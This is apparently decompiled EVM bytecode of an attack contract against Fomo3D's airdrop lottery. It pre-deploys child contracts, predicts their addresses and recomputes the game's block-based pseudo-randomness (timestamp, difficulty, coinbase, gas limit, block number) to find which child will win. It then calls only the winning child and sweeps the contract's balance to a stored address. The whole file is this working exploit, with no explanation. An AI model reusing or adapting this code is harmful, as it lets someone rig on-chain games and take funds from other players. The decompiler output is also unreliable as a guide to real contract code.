contract main {




// =====================  Runtime code  =====================


address owner;
address fomo3dAddress;
array of struct sub_efebc7b0;
address sub_71f7e0e2Address;
address sub_6e88bec4Address;
uint256 team;
uint256 sub_d3025c3e;
uint256 sub_1340f75d;
uint256 threshold;
array of uint256 stor29102676481673041902632991033461445430619272659676223336789171408008386403023;

function sub_1340f75d(?) {
    return sub_1340f75d
}

function threshold() {
    return threshold
}

function sub_6e88bec4(?) {
    return sub_6e88bec4Address
}

function sub_71f7e0e2(?) {
    return sub_71f7e0e2Address
}

function sub_7cb7cce5(?) {
    return sub_efebc7b0.length
}

function team() {
    return team
}

function owner() {
    return owner
}

function fomo3d() {
    return fomo3dAddress
}

function sub_d3025c3e(?) {
    return sub_d3025c3e
}

function sub_efebc7b0(?) {
    require arg1 < sub_efebc7b0.length
    return sub_efebc7b0[arg1].field_0, sub_efebc7b0[arg1].field_256
}

function _fallback() payable {
    revert
}

function updateThreshold(uint256 arg1) {
    require msg.sender == owner
    threshold = arg1
}

function sub_2fea06d8(?) {
    require msg.sender == owner
    sub_6e88bec4Address = arg1
    team = arg2
}

function sub_777b8488(?) {
    idx = 0
    while idx < sub_efebc7b0.length:
        mem[0] = 2
        if sub_efebc7b0[idx].field_0 != arg1:
            idx = idx + 1
            continue 
        return idx
    return -1
}

function sub_595dc855(?) {
    require msg.sender == owner
    idx = 0
    while idx < sub_efebc7b0.length:
        mem[0] = 2
        if sub_efebc7b0[idx].field_0 != arg1:
            idx = idx + 1
            continue 
        require idx < sub_efebc7b0.length
        sub_efebc7b0[idx].field_256 = arg2
        return 1
    return 0
}

function sub_a7fffc83(?) payable {
    mem[64] = 96
    require not msg.value
    s = 0
    idx = 0
    while idx < arg1:
        mem[mem[64] len 788] = code.data[3886 len 788]
        mem[mem[64] + 788] = this.address
        create contract with 0 wei
                        code: code.data[3886 len 788], this.address
        if not create.new_address:
            revert with ext_call.return_data[0 len return_data.size]
        _8 = mem[64]
        mem[64] = mem[64] + 64
        mem[_8] = address(create.new_address)
        mem[_8 + 32] = 1
        sub_efebc7b0.length++
        mem[0] = 2
        sub_efebc7b0[sub_efebc7b0.length].field_0 = address(create.new_address)
        stor4057[stor2.length] = 1
        s = create.new_address
        idx = idx + 1
        continue 
}

function canWin(address arg1) {
    require block.timestamp
    require block.timestamp
    if block.difficulty + block.timestamp < block.timestamp:
        revert with 0, 'SafeMath add failed'
    if sha3(address(block.coinbase, 0)) / block.timestamp < 0:
        revert with 0, 'SafeMath add failed'
    if block.gas_limit < 0:
        revert with 0, 'SafeMath add failed'
    if sha3(address(arg1, 0)) / block.timestamp < 0:
        revert with 0, 'SafeMath add failed'
    if block.number < 0:
        revert with 0, 'SafeMath add failed'
    require ext_code.size(fomo3dAddress)
    call fomo3dAddress.airDropTracker_() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if sha3(block.number + (sha3(address(arg1, 0)) / block.timestamp) + block.gas_limit + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.difficulty + block.timestamp) - (1000 * sha3(block.number + (sha3(address(arg1, 0)) / block.timestamp) + block.gas_limit + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.difficulty + block.timestamp) / 1000) >= ext_call.return_data[0] + 1:
        return 0
    return 1
}

function sub_bb2ba58c(?) payable {
    mem[64] = 160
    mem[96] = 0
    mem[128] = 0
    sub_d3025c3e++
    require ext_code.size(fomo3dAddress)
    call fomo3dAddress.airDropPot_() with:
         gas gas_remaining wei
    mem[160] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if ext_call.return_data[0] < threshold:
        if eth.balance(this.address) >= 10^17:
            call sub_71f7e0e2Address with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
    else:
        s = 0
        t = 96
        idx = 0
        while idx < sub_efebc7b0.length:
            mem[0] = 2
            _283 = mem[64]
            mem[64] = mem[64] + 64
            mem[_283] = sub_efebc7b0[idx].field_0
            mem[_283 + 32] = sub_efebc7b0[idx].field_256
            if 127 >= sub_efebc7b0[idx].field_256:
                _304 = mem[64]
                mem[mem[64] + 32] = address(sha3(0, 0, sub_efebc7b0[idx].field_0, sub_efebc7b0[idx].field_256))
                _305 = mem[64]
                mem[mem[64]] = 20
                mem[64] = mem[64] + 52
                _307 = mem[_305]
                t = _305 + 32
                u = mem[64]
                s = mem[_305]
                while s >= 32:
                    mem[u] = mem[t]
                    t = t + 32
                    u = u + 32
                    s = s - 32
                    continue 
                mem[mem[64] + floor32(mem[_305])] = mem[mem[64] + floor32(mem[_305])] and 256^(-(mem[_305] % 32) + 32) - 1 or mem[_305 + floor32(mem[_305]) + 32] and !(256^(-(mem[_305] % 32) + 32) - 1)
                _574 = sha3(mem[mem[64] len _304 + _307 + -mem[64] + 52])
                require block.timestamp
                _592 = mem[64]
                mem[mem[64] + 32] = address(block.coinbase)
                _593 = mem[64]
                mem[mem[64]] = 20
                mem[64] = mem[64] + 52
                _595 = mem[_593]
                t = _593 + 32
                u = _592 + 52
                s = mem[_593]
                while s >= 32:
                    mem[u] = mem[t]
                    t = t + 32
                    u = u + 32
                    s = s - 32
                    continue 
                mem[_592 + floor32(mem[_593]) + 52] = mem[_592 + floor32(mem[_593]) + 52] and 256^(-(mem[_593] % 32) + 32) - 1 or mem[_593 + floor32(mem[_593]) + 32] and !(256^(-(mem[_593] % 32) + 32) - 1)
                require block.timestamp
                if block.difficulty + block.timestamp < block.timestamp:
                    revert with 0, 'SafeMath add failed'
                if sha3(mem[_592 + 52 len _595]) / block.timestamp < 0:
                    revert with 0, 'SafeMath add failed'
                if block.gas_limit < 0:
                    revert with 0, 'SafeMath add failed'
                if _574 / block.timestamp < 0:
                    revert with 0, 'SafeMath add failed'
                if block.number < 0:
                    revert with 0, 'SafeMath add failed'
                mem[_592 + 84] = block.number + (_574 / block.timestamp) + block.gas_limit + (sha3(mem[_592 + 52 len _595]) / block.timestamp) + block.difficulty + block.timestamp
                mem[_592 + 52] = 32
                mem[64] = _592 + 116
                t = _592 + 84
                u = _592 + 116
                s = 32
                while s >= 32:
                    mem[u] = mem[t]
                    t = t + 32
                    u = u + 32
                    s = s - 32
                    continue 
                _973 = sha3(mem[_592 + 116])
                require ext_code.size(fomo3dAddress)
                call fomo3dAddress.airDropTracker_() with:
                     gas gas_remaining wei
                mem[_592 + 116] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                if _973 - (1000 * _973 / 1000) >= ext_call.return_data[0] + 1:
                    s = sha3(0, 0, sub_efebc7b0[idx].field_0, sub_efebc7b0[idx].field_256)
                    t = _283
                    idx = idx + 1
                    continue 
                sub_1340f75d++
                mem[_592 + 116] = address(sha3(0, 0, sub_efebc7b0[idx].field_0, sub_efebc7b0[idx].field_256))
                emit 0xdff41046: address(sha3(0, 0, sub_efebc7b0[idx].field_0, sub_efebc7b0[idx].field_256))
            else:
                if 255 >= sub_efebc7b0[idx].field_256:
                    _315 = mem[64]
                    mem[mem[64] + 32] = address(sha3(0, 0, sub_efebc7b0[idx].field_0, 0, sub_efebc7b0[idx].field_256))
                    _316 = mem[64]
                    mem[mem[64]] = 20
                    mem[64] = mem[64] + 52
                    _318 = mem[_316]
                    t = _316 + 32
                    u = _315 + 52
                    s = mem[_316]
                    while s >= 32:
                        mem[u] = mem[t]
                        t = t + 32
                        u = u + 32
                        s = s - 32
                        continue 
                    mem[_315 + floor32(mem[_316]) + 52] = mem[_315 + floor32(mem[_316]) + 52] and 256^(-(mem[_316] % 32) + 32) - 1 or mem[_316 + floor32(mem[_316]) + 32] and !(256^(-(mem[_316] % 32) + 32) - 1)
                    _569 = sha3(mem[_315 + 52 len _318])
                    require block.timestamp
                    mem[_315 + 84] = address(block.coinbase)
                    mem[_315 + 52] = 20
                    mem[64] = _315 + 104
                    t = _315 + 84
                    u = _315 + 104
                    s = 20
                    while s >= 32:
                        mem[u] = mem[t]
                        t = t + 32
                        u = u + 32
                        s = s - 32
                        continue 
                    mem[_315 + 104] = mem[_315 + 124 len 12] or Mask(160, 96, mem[_315 + 84])
                    require block.timestamp
                    if block.difficulty + block.timestamp < block.timestamp:
                        revert with 0, 'SafeMath add failed'
                    if sha3(mem[_315 + 104 len 20]) / block.timestamp < 0:
                        revert with 0, 'SafeMath add failed'
                    if block.gas_limit < 0:
                        revert with 0, 'SafeMath add failed'
                    if _569 / block.timestamp < 0:
                        revert with 0, 'SafeMath add failed'
                    if block.number < 0:
                        revert with 0, 'SafeMath add failed'
                    mem[_315 + 136] = block.number + (_569 / block.timestamp) + block.gas_limit + (sha3(mem[_315 + 104 len 20]) / block.timestamp) + block.difficulty + block.timestamp
                    mem[_315 + 104] = 32
                    mem[64] = _315 + 168
                    t = _315 + 136
                    u = mem[64]
                    s = mem[_315 + 104]
                    while s >= 32:
                        mem[u] = mem[t]
                        t = t + 32
                        u = u + 32
                        s = s - 32
                        continue 
                    mem[mem[64] + floor32(mem[_315 + 104])] = 256^(-(mem[_315 + 104] % 32) + 32) - 1 and mem[mem[64] + floor32(mem[_315 + 104])] or mem[_315 + floor32(mem[_315 + 104]) + 136] and !(256^(-(mem[_315 + 104] % 32) + 32) - 1)
                    _967 = sha3(mem[mem[64] len _315 + -mem[64] + 200])
                    require ext_code.size(fomo3dAddress)
                    call fomo3dAddress.airDropTracker_() with:
                         gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    if _967 - (1000 * _967 / 1000) >= ext_call.return_data[0] + 1:
                        s = sha3(0, 0, sub_efebc7b0[idx].field_0, 0, sub_efebc7b0[idx].field_256)
                        t = _283
                        idx = idx + 1
                        continue 
                    sub_1340f75d++
                    mem[mem[64]] = address(sha3(0, 0, sub_efebc7b0[idx].field_0, 0, sub_efebc7b0[idx].field_256))
                    emit 0xdff41046: address(sha3(0, 0, sub_efebc7b0[idx].field_0, 0, sub_efebc7b0[idx].field_256))
                else:
                    if 65535 >= sub_efebc7b0[idx].field_256:
                        _323 = mem[64]
                        mem[mem[64] + 32] = address(sha3(0, 0, sub_efebc7b0[idx].field_0, 0, sub_efebc7b0[idx].field_256))
                        _324 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _326 = mem[_324]
                        t = _324 + 32
                        u = mem[64]
                        s = mem[_324]
                        while s >= 32:
                            mem[u] = mem[t]
                            t = t + 32
                            u = u + 32
                            s = s - 32
                            continue 
                        mem[mem[64] + floor32(mem[_324])] = mem[mem[64] + floor32(mem[_324])] and 256^(-(mem[_324] % 32) + 32) - 1 or mem[_324 + floor32(mem[_324]) + 32] and !(256^(-(mem[_324] % 32) + 32) - 1)
                        _564 = sha3(mem[mem[64] len _323 + _326 + -mem[64] + 52])
                        require block.timestamp
                        _584 = mem[64]
                        mem[mem[64] + 32] = address(block.coinbase)
                        _585 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _587 = mem[_585]
                        t = _585 + 32
                        u = _584 + 52
                        s = mem[_585]
                        while s >= 32:
                            mem[u] = mem[t]
                            t = t + 32
                            u = u + 32
                            s = s - 32
                            continue 
                        mem[_584 + floor32(mem[_585]) + 52] = mem[_584 + floor32(mem[_585]) + 52] and 256^(-(mem[_585] % 32) + 32) - 1 or mem[_585 + floor32(mem[_585]) + 32] and !(256^(-(mem[_585] % 32) + 32) - 1)
                        require block.timestamp
                        if block.difficulty + block.timestamp < block.timestamp:
                            revert with 0, 'SafeMath add failed'
                        if sha3(mem[_584 + 52 len _587]) / block.timestamp < 0:
                            revert with 0, 'SafeMath add failed'
                        if block.gas_limit < 0:
                            revert with 0, 'SafeMath add failed'
                        if _564 / block.timestamp < 0:
                            revert with 0, 'SafeMath add failed'
                        if block.number < 0:
                            revert with 0, 'SafeMath add failed'
                        mem[_584 + 84] = block.number + (_564 / block.timestamp) + block.gas_limit + (sha3(mem[_584 + 52 len _587]) / block.timestamp) + block.difficulty + block.timestamp
                        mem[_584 + 52] = 32
                        mem[64] = _584 + 116
                        t = _584 + 84
                        u = _584 + 116
                        s = 32
                        while s >= 32:
                            mem[u] = mem[t]
                            t = t + 32
                            u = u + 32
                            s = s - 32
                            continue 
                        _961 = sha3(mem[_584 + 116])
                        require ext_code.size(fomo3dAddress)
                        call fomo3dAddress.airDropTracker_() with:
                             gas gas_remaining wei
                        mem[_584 + 116] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        if _961 - (1000 * _961 / 1000) >= ext_call.return_data[0] + 1:
                            s = sha3(0, 0, sub_efebc7b0[idx].field_0, 0, sub_efebc7b0[idx].field_256)
                            t = _283
                            idx = idx + 1
                            continue 
                        sub_1340f75d++
                        mem[_584 + 116] = address(sha3(0, 0, sub_efebc7b0[idx].field_0, 0, sub_efebc7b0[idx].field_256))
                        emit 0xdff41046: address(sha3(0, 0, sub_efebc7b0[idx].field_0, 0, sub_efebc7b0[idx].field_256))
                    else:
                        if 16777215 >= sub_efebc7b0[idx].field_256:
                            _332 = mem[64]
                            mem[mem[64] + 32] = address(sha3(0, 0, sub_efebc7b0[idx].field_0, 0, sub_efebc7b0[idx].field_256))
                            _333 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _335 = mem[_333]
                            t = _333 + 32
                            u = _332 + 52
                            s = mem[_333]
                            while s >= 32:
                                mem[u] = mem[t]
                                t = t + 32
                                u = u + 32
                                s = s - 32
                                continue 
                            mem[_332 + floor32(mem[_333]) + 52] = mem[_332 + floor32(mem[_333]) + 52] and 256^(-(mem[_333] % 32) + 32) - 1 or mem[_333 + floor32(mem[_333]) + 32] and !(256^(-(mem[_333] % 32) + 32) - 1)
                            _559 = sha3(mem[_332 + 52 len _335])
                            require block.timestamp
                            mem[_332 + 84] = address(block.coinbase)
                            mem[_332 + 52] = 20
                            mem[64] = _332 + 104
                            t = _332 + 84
                            u = _332 + 104
                            s = 20
                            while s >= 32:
                                mem[u] = mem[t]
                                t = t + 32
                                u = u + 32
                                s = s - 32
                                continue 
                            mem[_332 + 104] = mem[_332 + 124 len 12] or Mask(160, 96, mem[_332 + 84])
                            require block.timestamp
                            if block.difficulty + block.timestamp < block.timestamp:
                                revert with 0, 'SafeMath add failed'
                            if sha3(mem[_332 + 104 len 20]) / block.timestamp < 0:
                                revert with 0, 'SafeMath add failed'
                            if block.gas_limit < 0:
                                revert with 0, 'SafeMath add failed'
                            if _559 / block.timestamp < 0:
                                revert with 0, 'SafeMath add failed'
                            if block.number < 0:
                                revert with 0, 'SafeMath add failed'
                            mem[_332 + 136] = block.number + (_559 / block.timestamp) + block.gas_limit + (sha3(mem[_332 + 104 len 20]) / block.timestamp) + block.difficulty + block.timestamp
                            mem[_332 + 104] = 32
                            mem[64] = _332 + 168
                            t = _332 + 136
                            u = _332 + 168
                            s = 32
                            while s >= 32:
                                mem[u] = mem[t]
                                t = t + 32
                                u = u + 32
                                s = s - 32
                                continue 
                            _955 = sha3(mem[_332 + 168])
                            require ext_code.size(fomo3dAddress)
                            call fomo3dAddress.airDropTracker_() with:
                                 gas gas_remaining wei
                            mem[_332 + 168] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            if _955 - (1000 * _955 / 1000) >= ext_call.return_data[0] + 1:
                                s = sha3(0, 0, sub_efebc7b0[idx].field_0, 0, sub_efebc7b0[idx].field_256)
                                t = _283
                                idx = idx + 1
                                continue 
                            sub_1340f75d++
                            mem[_332 + 168] = address(sha3(0, 0, sub_efebc7b0[idx].field_0, 0, sub_efebc7b0[idx].field_256))
                            emit 0xdff41046: address(sha3(0, 0, sub_efebc7b0[idx].field_0, 0, sub_efebc7b0[idx].field_256))
                        else:
                            _319 = mem[64]
                            mem[mem[64] + 32] = address(s)
                            _320 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _322 = mem[_320]
                            u = _320 + 32
                            v = mem[64]
                            t = mem[_320]
                            while t >= 32:
                                mem[v] = mem[u]
                                u = u + 32
                                v = v + 32
                                t = t - 32
                                continue 
                            mem[mem[64] + floor32(mem[_320])] = mem[mem[64] + floor32(mem[_320])] and 256^(-(mem[_320] % 32) + 32) - 1 or mem[_320 + floor32(mem[_320]) + 32] and !(256^(-(mem[_320] % 32) + 32) - 1)
                            _554 = sha3(mem[mem[64] len _319 + _322 + -mem[64] + 52])
                            require block.timestamp
                            _576 = mem[64]
                            mem[mem[64] + 32] = address(block.coinbase)
                            _577 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _579 = mem[_577]
                            u = _577 + 32
                            v = mem[64]
                            t = mem[_577]
                            while t >= 32:
                                mem[v] = mem[u]
                                u = u + 32
                                v = v + 32
                                t = t - 32
                                continue 
                            mem[mem[64] + floor32(mem[_577])] = mem[mem[64] + floor32(mem[_577])] and 256^(-(mem[_577] % 32) + 32) - 1 or mem[_577 + floor32(mem[_577]) + 32] and !(256^(-(mem[_577] % 32) + 32) - 1)
                            require block.timestamp
                            if block.difficulty + block.timestamp < block.timestamp:
                                revert with 0, 'SafeMath add failed'
                            if sha3(mem[mem[64] len _576 + _579 + -mem[64] + 52]) / block.timestamp < 0:
                                revert with 0, 'SafeMath add failed'
                            if block.gas_limit < 0:
                                revert with 0, 'SafeMath add failed'
                            if _554 / block.timestamp < 0:
                                revert with 0, 'SafeMath add failed'
                            if block.number < 0:
                                revert with 0, 'SafeMath add failed'
                            _846 = mem[64]
                            mem[mem[64] + 32] = block.number + (_554 / block.timestamp) + block.gas_limit + (sha3(mem[mem[64] len _576 + _579 + -mem[64] + 52]) / block.timestamp) + block.difficulty + block.timestamp
                            _847 = mem[64]
                            mem[mem[64]] = 32
                            mem[64] = mem[64] + 64
                            _849 = mem[_847]
                            u = _847 + 32
                            v = _846 + 64
                            t = mem[_847]
                            while t >= 32:
                                mem[v] = mem[u]
                                u = u + 32
                                v = v + 32
                                t = t - 32
                                continue 
                            mem[_846 + floor32(mem[_847]) + 64] = 256^(-(mem[_847] % 32) + 32) - 1 and mem[_846 + floor32(mem[_847]) + 64] or mem[_847 + floor32(mem[_847]) + 32] and !(256^(-(mem[_847] % 32) + 32) - 1)
                            _949 = sha3(mem[_846 + 64 len _849])
                            require ext_code.size(fomo3dAddress)
                            call fomo3dAddress.airDropTracker_() with:
                                 gas gas_remaining wei
                            mem[_846 + 64] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            if _949 - (1000 * _949 / 1000) >= ext_call.return_data[0] + 1:
                                s = s
                                t = _283
                                idx = idx + 1
                                continue 
                            sub_1340f75d++
                            mem[_846 + 64] = address(s)
                            emit 0xdff41046: address(s)
            require ext_code.size(mem[_283 + 12 len 20])
            call mem[_283 + 12 len 20].0xb8415332 with:
               value msg.value wei
                 gas gas_remaining wei
                args sub_6e88bec4Address, team
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            call sub_71f7e0e2Address with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            return 1
        if eth.balance(this.address) > 0:
            call sub_71f7e0e2Address with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
    return 0
}



}
